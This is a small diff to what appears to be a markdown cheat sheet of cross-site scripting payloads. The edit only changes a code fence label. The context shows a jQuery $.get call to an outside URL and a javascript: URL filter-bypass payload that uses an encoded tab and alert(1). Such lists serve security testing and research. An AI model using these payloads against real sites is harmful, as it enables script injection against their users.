@@ -42,7 +42,7 @@ $.get('http://sakurity.com/jqueryxss')
 
 **URL verification bypasses (works without `&#x09;` too)**
 
-```html
+```js
 javas&#x09;cript://www.google.com/%0Aalert(1)
 ```
 
